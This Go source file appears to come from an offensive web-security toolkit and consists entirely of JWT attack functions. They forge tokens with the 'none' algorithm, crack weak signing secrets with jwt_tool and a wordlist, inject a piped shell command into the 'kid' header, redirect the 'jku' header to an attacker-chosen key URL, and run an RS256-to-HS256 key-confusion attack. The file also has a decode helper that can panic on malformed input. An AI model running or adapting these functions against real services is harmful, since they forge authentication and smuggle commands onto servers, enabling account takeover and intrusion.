package websecurity

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

func JWTNoneAlg(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode JWT header: %w", err)
	}
	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("failed to parse JWT header: %w", err)
	}
	header["alg"] = "none"
	newHeader, _ := json.Marshal(header)
	newEncoded := base64.RawURLEncoding.EncodeToString(newHeader)
	forgedToken := fmt.Sprintf("%s.%s.", newEncoded, parts[1])
	return fmt.Sprintf("JWT none algorithm token forged: %s", forgedToken), nil
}

func JWTWeakSecret(token, wordlist string) (string, error) {
	cmd := throttledExec("jwt_tool", token, "-C", "-d", wordlist)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("jwt_tool weak secret crack failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("JWT weak secret cracking completed on %s with wordlist %s: %s", token, wordlist, strings.TrimSpace(string(out))), nil
}

func JWTKidInjection(token, cmd string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode JWT header: %w", err)
	}
	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("failed to parse JWT header: %w", err)
	}
	header["kid"] = fmt.Sprintf("|%s", cmd)
	newHeader, _ := json.Marshal(header)
	newEncoded := base64.RawURLEncoding.EncodeToString(newHeader)
	forgedToken := fmt.Sprintf("%s.%s.", newEncoded, parts[1])
	return fmt.Sprintf("JWT kid injection token forged: %s", forgedToken), nil
}

func JWTJKUInjection(token, jkuURL string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode JWT header: %w", err)
	}
	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("failed to parse JWT header: %w", err)
	}
	header["jku"] = jkuURL
	newHeader, _ := json.Marshal(header)
	newEncoded := base64.RawURLEncoding.EncodeToString(newHeader)
	forgedToken := fmt.Sprintf("%s.%s.", newEncoded, parts[1])
	return fmt.Sprintf("JWT jku injection token forged with JKU %s: %s", jkuURL, forgedToken), nil
}

func JWTPublicKeyConfusion(rsaToken, publicKeyFile string) (string, error) {
	cmd := throttledExec("jwt_tool", rsaToken, "-X", "rsa2hs", "-pk", publicKeyFile)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("JWT public key confusion attack failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("JWT RS256-to-HS256 confusion attack completed with key %s: %s", publicKeyFile, strings.TrimSpace(string(out))), nil
}

func JWTDecode(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}
	var decoded []string
	for _, p := range parts[:2] {
		padded := p
		switch len(p) % 4 {
		case 2:
			padded += "=="
		case 3:
			padded += "="
		}
		b, err := base64.StdEncoding.DecodeString(padded)
		if err != nil {
			b, err = base64.RawURLEncoding.DecodeString(p)
			if err != nil {
				continue
			}
		}
		decoded = append(decoded, string(b))
	}
	return fmt.Sprintf("JWT decoded:\nHeader: %s\nPayload: %s", decoded[0], decoded[1]), nil
}
